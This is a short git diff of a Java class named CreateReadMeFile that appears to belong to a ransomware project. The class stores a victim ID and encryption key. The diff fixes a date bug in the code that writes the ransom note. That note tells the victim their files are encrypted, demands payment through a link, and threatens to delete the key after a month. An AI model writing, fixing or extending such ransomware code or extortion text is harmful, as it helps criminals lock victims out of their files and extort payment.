@@ -5,6 +5,7 @@ import java.io.IOException;
 
 import java.text.SimpleDateFormat;
 import java.time.LocalDate;
+import java.util.Date;
 
 public class CreateReadMeFile {
     private static String victimID, encryptionKey;
@@ -22,7 +23,7 @@ public class CreateReadMeFile {
 
     public void initContent() {
         SimpleDateFormat df = new SimpleDateFormat("yyy-MM-dd");
-        String date = df.format(LocalDate.now());
+        String date = df.format(new Date());
         content = "All your files are encrypted n_n, but don't worry the encryption key is safe on our database :D\n" +
                 "If you want to get the key, you can go to the following link and pay " + salaryOfEncryptionKey + "$ and we will send the key to you within 72 hours \uD83D\uDE09\n" +
                 "Also note that hosting the database is not free, so please pay the amount within a month from the date of " + date + ", and if you do not do this, your key will be deleted and we will not be able to help you retrieve your files\n" +
